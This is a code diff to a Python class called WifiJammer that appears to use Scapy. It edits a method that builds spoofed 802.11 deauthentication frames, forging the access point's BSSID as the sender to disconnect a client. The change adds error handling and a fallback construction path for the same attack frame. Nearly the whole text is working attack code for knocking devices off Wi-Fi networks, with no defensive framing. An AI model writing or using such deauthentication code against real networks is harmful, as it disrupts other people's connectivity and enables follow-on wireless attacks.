@@ -750,20 +750,45 @@ class WifiJammer:
         Returns:
             Raw deauthentication packet bytes
         """
-        # Create deauthentication frame
-        dot11 = Dot11(
-            type=0,                    # Management frame
-            subtype=12,                # Deauthentication
-            addr1=client_mac,          # Destination (client)
-            addr2=target_bssid,        # Source (AP)
-            addr3=target_bssid,        # BSSID (AP)
-            FCfield="from-DS"          # From distribution system
-        )
+        try:
+            # Create deauthentication frame
+            # For client deauth: AP (addr2) sends to client (addr1) with BSSID (addr3)
+            # FCfield=2 sets the From-DS flag (frame from distribution system)
+            dot11 = Dot11(
+                type=0,                    # Management frame
+                subtype=12,                # Deauthentication
+                addr1=client_mac,          # Destination (client)
+                addr2=target_bssid,        # Source (AP)
+                addr3=target_bssid,        # BSSID (AP)
+                FCfield=2                  # From-DS flag (0x02)
+            )
 
-        deauth = Dot11Deauth(reason=7)  # Reason 7: Class 3 frame received from nonassociated STA
+            deauth = Dot11Deauth(reason=7)  # Reason 7: Class 3 frame received from nonassociated STA
 
-        # Build complete packet with RadioTap header
-        packet = RadioTap() / dot11 / deauth
+            # Build complete packet with RadioTap header
+            packet = RadioTap() / dot11 / deauth
+
+            return packet
+
+        except Exception as e:
+            logger.error(f"Error building deauth packet: {e}")
+            # Fallback to simpler packet construction
+            try:
+                dot11 = Dot11(
+                    type=0,
+                    subtype=12,
+                    addr1=client_mac,
+                    addr2=target_bssid,
+                    addr3=target_bssid
+                )
+                # Set From-DS flag manually
+                dot11.FCfield = 2
+                deauth = Dot11Deauth(reason=7)
+                packet = RadioTap() / dot11 / deauth
+                return packet
+            except Exception as e2:
+                logger.error(f"Error building fallback deauth packet: {e2}")
+                raise
 
         return packet
 
